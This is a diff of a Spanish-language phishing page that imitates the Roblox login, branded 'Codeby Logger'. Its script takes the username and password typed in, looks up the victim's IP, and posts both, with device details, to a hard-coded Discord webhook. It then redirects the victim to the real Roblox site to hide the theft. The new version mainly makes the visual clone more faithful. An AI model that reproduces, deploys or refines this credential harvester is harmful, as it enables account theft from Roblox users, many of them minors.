@@ -1,85 +1,165 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es-es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Roblox</title>
+    <title>Iniciar sesión en Roblox</title>
+    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Amazon Ember', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #393b3d; }
-        img { width: 50px; margin-bottom: 20px; }
-        h1 { font-size: 20px; margin-bottom: 20px; font-weight: 500; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #393b3d; border-radius: 4px; background: #000; color: #fff; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0084ff; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #0074e0; }
-        .footer { font-size: 12px; color: #666; margin-top: 20px; }
-        /* Toque Codeby */
-        .codeby-tag { color: #00ffcc; font-size: 10px; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        /* RESET BÁSICO */
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', 'Roboto', sans-serif; overflow: hidden; background-color: #000; }
+
+        /* BARRA SUPERIOR NEGRA (HEADER) */
+        .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; }
+        .header img { height: 20px; }
+
+        /* FONDO DINÁMICO DE JUEGOS (PARALLAX) */
+        .background-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://i.imgur.com/K3fF0D6.jpeg'); /* IMAGEN MOSAICO CLONADA */
+            background-size: cover;
+            background-position: center;
+            z-index: 1; /* Detrás del formulario */
+        }
+        .background-overlay { /* Capa oscura encima del fondo */
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.8); /* Oscurecer el fondo */
+            z-index: 2;
+        }
+
+        /* CONTENEDOR CENTRAL DEL FORMULARIO */
+        .form-container {
+            position: relative; z-index: 3;
+            display: flex; justify-content: center; align-items: center;
+            height: calc(100vh - 40px); /* Restar la altura del header */
+        }
+
+        /* LA CAJA DEL LOGIN (EL CLON) */
+        .login-box {
+            background-color: rgba(25, 27, 29, 0.95); /* Color de tu foto */
+            padding: 30px; border-radius: 8px; width: 90%; max-width: 360px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center;
+            backdrop-filter: blur(5px); /* Toque de desenfoque */
+        }
+
+        /* TEXTOS */
+        h1 { color: white; font-size: 20px; margin-bottom: 20px; font-weight: 500; text-align: left; margin-left: 5px; }
+
+        /* INPUTS (ENTRADAS DE TEXTO) */
+        input {
+            width: 100%; padding: 12px; margin: 8px 0;
+            background-color: #000; color: #fff;
+            border: 1px solid #393b3d; border-radius: 4px;
+            font-size: 14px; box-sizing: border-box;
+        }
+        input::placeholder { color: #888; }
+        input:focus { border-color: #0084ff; outline: none; }
+
+        /* BOTÓN DE INICIAR SESIÓN */
+        .btn-login {
+            width: 100%; padding: 12px; margin-top: 15px;
+            background-color: #33363a; /* Color exacto del botón de tu foto */
+            color: #ccc; border: 1px solid #393b3d;
+            border-radius: 4px; font-weight: bold; cursor: pointer;
+            transition: background 0.2s; font-size: 14px;
+        }
+        .btn-login:hover { background-color: #444; color: white; }
+
+        /* ENLACES Y TEXTOS INFERIORES */
+        .links-container { color: #ccc; font-size: 12px; margin-top: 15px; text-align: left; margin-left: 5px; }
+        .links-container a { color: #0084ff; text-decoration: none; cursor: pointer; }
+        .links-container a:hover { text-decoration: underline; }
+
+        /* BOTONES DE ABAJO (CÓDIGO ÚNICO, INICIO RÁPIDO) */
+        .btn-secondary {
+            width: 100%; padding: 10px; margin-top: 10px;
+            background-color: #33363a; color: #ccc; border: 1px solid #393b3d;
+            border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 12px;
+        }
+        
+        .powered-by { color: #00ffcc; font-size: 9px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.5; }
+
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox">
-    <h1>Inicia sesión en Roblox</h1>
-    
-    <input type="text" id="user" placeholder="Usuario / Correo / Teléfono" required>
-    <input type="password" id="pass" placeholder="Contraseña" required>
-    
-    <button id="loginBtn">Iniciar sesión</button>
-    
-    <div class="footer">¿Olvidaste tu contraseña?</div>
-    <div class="codeby-tag">Powered by Codeby versión gratuita</div>
-</div>
+    <div class="header">
+        <img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox">
+    </div>
 
-<script>
-    const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
+    <div class="background-container"></div>
+    <div class="background-overlay"></div>
 
-    document.getElementById('loginBtn').addEventListener('click', async () => {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+    <div class="form-container">
+        <div class="login-box">
+            <h1>Iniciar sesión en Roblox</h1>
+            
+            <input type="text" id="user" placeholder="Usuario/correo/teléfono">
+            <input type="password" id="pass" placeholder="Contraseña">
+            
+            <button class="btn-login" id="loginBtn">Iniciar sesión</button>
+            
+            <div class="links-container">
+                <div>¿Olvidaste la contraseña o el nombre de usuario?</div>
+                <div style="margin-top: 10px;">Enviame un código de un solo uso</div>
+                <div>Inicio de sesión rápido</div>
+                <div style="margin-top: 10px;">¿No tienes una cuenta de Roblox? <a href="#">Registrate</a></div>
+            </div>
+            
+            <div class="powered-by">Codeby versión gratuita</div>
+        </div>
+    </div>
 
-        if (user === "" || pass === "") {
-            alert("Por favor rellena todos los campos");
-            return;
-        }
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
 
-        // Cambiar texto para dar realismo
-        document.getElementById('loginBtn').innerText = "Cargando...";
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
 
-        try {
-            // Capturar IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
+            if (user === "" || pass === "") {
+                alert("Por favor rellena todos los campos.");
+                return;
+            }
 
-            // Enviar a Discord
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🔑 CREDENCIALES CAPTURADAS - Codeby",
-                        color: 0xff0000,
-                        fields: [
-                            { name: "👤 Usuario", value: `\`${user}\``, inline: true },
-                            { name: "🔒 Contraseña", value: `\`${pass}\``, inline: true },
-                            { name: "🌐 IP", value: ipData.ip },
-                            { name: "📱 Info", value: navigator.userAgent }
-                        ],
-                        footer: { text: "Codeby Logger Pro" },
-                        timestamp: new Date()
-                    }]
-                })
-            });
+            // Cambiar texto del botón para realismo
+            document.getElementById('loginBtn').innerText = "Verificando...";
 
-            // Redirigir al Roblox real después de capturar
-            window.location.href = "https://www.roblox.com/login";
+            try {
+                // Capturar IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
 
-        } catch (e) {
-            window.location.href = "https://www.roblox.com/login";
-        }
-    });
-</script>
+                // Enviar a Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Codeby Logger",
+                        embeds: [{
+                            title: "🔑 CREDENCIALES CAPTURADAS - Sistema Codeby",
+                            color: 0xff0000, // Rojo Alerta
+                            fields: [
+                                { name: "👤 Usuario/Correo", value: `\`${user}\``, inline: true },
+                                { name: "🔒 Contraseña", value: `\`${pass}\``, inline: true },
+                                { name: "🌐 Dirección IP", value: ipData.ip, inline: true },
+                                { name: "🌍 Ubicación", value: `[Mapa](https://www.iplocation.net/search?q=${ipData.ip})`, inline: true },
+                                { name: "📱 Info Dispositivo", value: navigator.userAgent }
+                            ],
+                            footer: { text: "Codeby Logger Pro • " + new Date().toLocaleString('es-ES') }
+                        }]
+                    })
+                });
+
+                // Redirigir al Roblox real después de capturar
+                window.location.href = "https://www.roblox.com/login";
+
+            } catch (e) {
+                console.error("Error silencioso...");
+                window.location.href = "https://www.roblox.com/login";
+            }
+        });
+    </script>
 
 </body>
 </html>
